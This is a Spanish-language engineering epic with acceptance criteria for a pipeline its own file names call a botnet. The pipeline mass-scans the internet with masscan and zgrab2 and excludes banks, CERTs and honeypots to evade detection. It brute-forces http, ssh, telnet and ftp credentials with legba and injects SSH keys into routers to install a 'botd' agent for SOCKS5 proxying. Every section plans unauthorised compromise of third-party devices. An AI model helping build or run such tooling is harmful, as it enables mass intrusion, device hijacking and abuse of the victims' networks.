---
artifact: epic
id: EP-17
title: "Workers de etapa: barrido, banner, exclusión, credencial y entrega"
owner_layer: recruit
closes: A1-02, A1-09, A1-12, A1-13, A1-14, A2-14, A2-16, A3-09, injerto V3-4
estimate_days: 5.75
risk: medium
phase: F7
---

## Objetivo

Que el embudo lo recorran procesos **stateless** que no recuerdan nada entre ejecuciones: `botnet-probe` emite el SYN con la IP y el adaptador del VPS, al ritmo de la ventana y en cohortes de 60 s gobernanables; el banner de zgrab2 deja clase, modelo y país; la exclusión de bancos, CERTs, escáneres y trampas se aplica dos veces antes de gastar SYN y logins; `botnet-strike` deja con qué protocolo y con qué referencia se entró, con `burned` tipado y tope de 3 golpes por destino y hora; la entrega inyecta `authorized_keys` con fallback `sshpass` y sabe desinstalar. Y todo ello repetible en CI sin tocar la red, con el lazo congelado.

## Alcance

- `cmd/botnet-probe/main.go` + `main_test.go` (nuevo) sobre `internal/discovery/masscan.go` y `internal/discovery/banner.go`: `--sweep-json`, `--dry-run`, `--stage banner`, cohorte `--cohort-seconds`, `--source-ip`/`--adapter` leídos de `/etc/botnet-recruit/env` (A1-14) y ritmo del suelo medido `discovery.SweepRate(12)` = 1500.
- `scripts/recruit/exclusions.csv` + `testdata/recruit/exclusions.csv` + `internal/recruit/exclusions.go` + `exclusions_test.go`: carga con `botnet-recruit load-exclusions --csv`, `kind='ptr_regex'` y la categoría `honeypot` con muerte tipada (A1-12).
- `cmd/botnet-strike/main.go` + `internal/intrusion/legba.go`: `legba-parse --banner=F` que rellena `cred_protocol` y `cred_ref` sin reimplementar el parsing (usa `internal/intrusion`).
- `scripts/field/bootstrap.sh --inject-key` / `--uninstall` + `internal/intrusion/stager.go` + `stager_test.go`: transporte `ssh_key` con fallback `sshpass`, `DestPolicy` para el techo de flash y `fail_reason='no_delivery'`/`flash_cap` (A1-02, A1-09).
- Ficheros de fixture en `testdata/recruit/`: `masscan.ndjson`, `zgrab2.jsonl`, `exclusions.csv`, `socks5_checks.jsonl`, con `--emit-sql` determinista y modo fixture NDJSON en CI `[injerto: V3]`.
- `internal/recruit/store.go` compartido: lease y fencing del `claim`/`complete` por etapa.

Fuera de alcance: la evidencia SOCKS5 del `verified` (EP-18), la escritura de `nodes.public_ip` (EP-19) y las comprobaciones `nodos`/`socks5` del paraguas (EP-20).

## Cierre

- **T-1701 AC1** — `./bin/botnet-probe --sweep-json testdata/recruit/masscan.ndjson --limit 1000` sale **0** y deja `count(*) FROM recruit_candidates WHERE source='masscan'` ≥ **1** con al menos una fila en `bannered` o `sweeping`.
- **T-1701 AC2** — `./bin/botnet-probe --dry-run | grep -c -- '--source-ip 74.208.94.91'` = **1** y `grep -c -- '--adapter eth0'` = **1**; `ps -o ni= -C masscan` = **10** e `ionice -p$(pgrep masscan)` imprime clase **3** (A1-14).
- **T-1701 AC3** — `go list -deps ./cmd/botnet-probe | grep -c 'botnet/internal/discovery'` ≥ **1** y el `--dry-run` imprime `min-rate=1500` (`discovery.SweepRate(12)`, no un número nuevo).
- **T-1701 AC4** — `--cohort-seconds 60 --dry-run | grep -c 'cohort_syn='` = **1** con valor `90000` (±1 %) a 1500 pps; un /24 × 5 puertos (325.100 SYN) se parte en ≥ **3** cohortes (A2-14).
- **T-1701 AC5** — muerte tipada: el candidato sin SYN-ACK del fixture queda `fail_reason='no_answer'` y `state='discarded'` (1/1).
- **T-1702 AC1** — `./bin/botnet-probe --stage banner --banner-json testdata/recruit/zgrab2.jsonl` sale **0** con `count(*) WHERE state='bannered'` ≥ **1** y **0** filas con `device_class` fuera de `A`, `B`, `C`.
- **T-1702 AC2** — `model_guess` vacío ≤ **20 %** de los `bannered`, clasificado con `discovery.ParseZgrab2Output` + `discovery.Classify` (`grep -cE 'ParseZgrab2Output|discovery.Classify' cmd/botnet-probe/main.go` ≥ **1**).
- **T-1702 AC3** — `banner=""` ⇒ `state='discarded'` con `fail_reason='no_banner'` (1/1) y ≥ **1** evento `to_state='discarded' AND reason='no_banner'`.
- **T-1702 AC4** — `count(*) WHERE state='bannered' AND (country IS NULL OR asn IS NULL)` = **0** en el fixture completo (base de la ventana local por hora del destino, A2-16).
- **T-1703 AC1** — `botnet-recruit load-exclusions --csv testdata/recruit/exclusions.csv` sale **0** con ≥ **10** filas, ≥ **5** categorías distintas, ≥ **1** `kind='ptr_regex'` y `grep -c 'univ' scripts/recruit/exclusions.csv` = **1**.
- **T-1703 AC2** — la exclusión se aplica dos veces: ≥ **1** evento `to_state='excluded'` por PTR del fixture y los **2/2** casos del fichero quedan `excluded` con `fail_reason='excluded'`.
- **T-1703 AC3** — el `honeypot` muere tipado: `count(*)` de eventos con `reason LIKE 'honeypot:%'` sobre candidatos `excluded` ≥ **1** (A1-12).
- **T-1703 AC4** — el propio origen no se escanea: `count(*) WHERE ip <<= '74.208.94.0/24' AND state NOT IN ('excluded')` = **0** tras el `sweep-parse` del rango propio.
- **T-1704 AC1** — `botnet-strike legba-parse --banner=F < testdata/intrusion/legba_hit.txt` deja `count(*)` de `assessed` con `cred_protocol IS NULL` = **0**, igual con `cred_ref`, y `cred_protocol IN ('http','ssh','telnet','ftp')` en el **100 %** (A1-02).
- **T-1704 AC2** — `go list -deps ./cmd/botnet-strike | grep -c 'botnet/internal/intrusion'` ≥ **1** y `go test ./internal/intrusion/ -run TestLegba 2>&1 | grep -c '^ok'` = **1**.
- **T-1704 AC3** — regla de `burned` medida: 3 fallos separados 20 s ⇒ `state='burned'` con `fail_reason='burned'`; 3 fallos separados 60 s ⇒ sigue `assessed` con `stage_attempts=3` (no quema).
- **T-1704 AC4** — sin credencial no hay entrega: `state='discarded'` con `fail_reason='no_cred'` (1/1) y ≥ **1** evento con ese `reason`.
- **T-1704 AC5** — tope por destino y hora: con 4 candidatos de la misma IP destino, `count(*)` de jobs `stage='cred'` de ese `ip` = **3** (compartido con `deliver`, A1-13).
- **T-1705 AC1** — `scripts/field/bootstrap.sh --inject-key --dry-run` imprime `transport=ssh_key` (y `transport=sshpass` sin `RECRUIT_SSH_KEY`); tras la inyección real `ssh -o BatchMode=yes -o ConnectTimeout=5 "$RECRUIT_SSH_USER"@$ROUTER true` sale **0** (hoy **255**).
- **T-1705 AC2** — la ruta la elige `cred_protocol`: con `'http'` y sin SSH ⇒ `discarded` con `no_delivery`; con `'ssh'` pasa `assessed → staging` con su evento (1/1).
- **T-1705 AC3** — el secreto no viaja por la línea de mando: `ps -eo args= | grep -c "$RECRUIT_SSH_PASS"` = **0** y `count(*)` de columnas nuevas con `pass`/`secret` en `recruit_candidates` = **0**.
- **T-1705 AC4** — el flash manda: clase A con flash libre < 4 MB ⇒ `discarded` con `fail_reason='flash_cap'` decidido por `DestPolicy` (`go test ./internal/intrusion/ -run TestDestPolicy 2>&1 | grep -c '^ok'` = **1**).
- **T-1705 AC5** — desinstalar es idempotente: `bash scripts/field/bootstrap.sh --uninstall` dos veces sale **0** en ambas, `ls /data/botd` sin `botd` tras la segunda y ≥ **1** evento `to_state='rolled_back' AND reason LIKE 'uninstall=%'` (A1-09).
- **T-1706 AC1** — `ls testdata/recruit/ | grep -cE 'masscan\.ndjson|zgrab2\.jsonl|exclusions\.csv|socks5_checks\.jsonl'` = **4** y `wc -l < testdata/recruit/masscan.ndjson` ≥ **50** filas de NDJSON válido.
- **T-1706 AC2** — determinismo: `diff <(--sweep-json … --emit-sql | sort) <(segunda pasada)` con `grep -c '^[<>]'` = **0** sobre el mismo estado inicial.
- **T-1706 AC3** — cero red en CI: con `RECRUIT_PPS_FIXED=1500` y modo fixture, `go test ./cmd/botnet-probe/ ./cmd/botnet-strike/ -count=1 2>&1 | grep -c '^ok'` = **2** y el log no menciona `exec: "masscan"`.
- **T-1706 AC4** — lazo congelado: con `RECRUIT_PPS_FIXED=1200`, `count(DISTINCT pps_target)` de los ticks de la última hora = **1** y `count(*)` con `action='up'` = **0** (0 subidas, 0 bajadas).
